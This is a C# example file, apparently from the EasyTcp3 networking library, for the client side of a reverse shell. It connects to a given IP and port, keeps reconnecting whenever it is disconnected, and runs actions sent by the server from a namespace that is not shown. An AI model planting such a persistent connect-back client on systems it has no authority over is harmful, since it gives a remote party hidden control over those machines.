using System;
using System.Threading.Tasks;
using EasyTcp3.Actions;
using EasyTcp3.ClientUtils;
using EasyTcp3.ClientUtils.Async;

namespace EasyTcp3.Examples.ReverseShell.Client
{
    public class ReverseShellClient
    {
        private const int ConnectTimeout = 5_00;

        public async Task Start(string ip, ushort port)
        {
            // Use namespace filter to only get the actions of this client
            using var client = new EasyTcpActionClient(nameSpace: "EasyTcp3.Examples.ReverseShell.Client.Actions");
            client.OnUnknownAction +=
                (s, m) => client.Send("Unknown action"); // Send message to server if action is unknown
            client.OnDisconnect +=
                async (s, c) => await Connect(client, ip, port); // Try to reconnect if disconnected from server
            client.OnError += (s, e) => client.Send($"Client error: {e.Message}");
            await Connect(client, ip, port); // Connect to server
            await Task.Delay(-1);
        }

        private async Task Connect(EasyTcpClient client, string ip, ushort port)
        {
            client.Dispose(); // Reset client
            while (!await client.ConnectAsync(ip, port)) await Task.Delay(ConnectTimeout);
        }
    }
}